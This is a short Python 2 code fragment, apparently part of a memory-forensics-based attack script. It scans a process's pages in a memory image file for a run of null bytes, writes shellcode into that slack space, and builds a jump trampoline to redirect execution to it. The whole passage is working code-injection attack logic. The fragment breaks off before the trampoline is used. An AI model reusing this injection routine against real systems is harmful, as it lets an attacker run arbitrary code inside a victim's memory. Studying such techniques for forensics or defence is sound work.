for page in pages:
  physical = address_space.vtop(page[0])
  if physical is not None:
    if slack_space is None:
      fd = open(memory_file,"r+")
      fd.seek(physical)
      buf = fd.read(page[1])
      try:
        offset = buf.index("\x00" * len(sc))
        slack_space = page[0] + offset
        print "[*] Found good shellcode location!"
        print "[*] Virtual address: 0x%08x" % slack_space
        print "[*] Physical address: 0x%08x" % (physical + offset)
        print "[*] Injecting shellcode."
        fd.seek(physical + offset)
        fd.write(sc)
        fd.flush()
        # create our trampoline
        tramp = "\xbb%s" % struct.pack("<L", page[0] + offset)
        tramp += "\xff\xe3"
        if trampoline_offset is not None:
          break
      except:
        pass
      fd.close()  
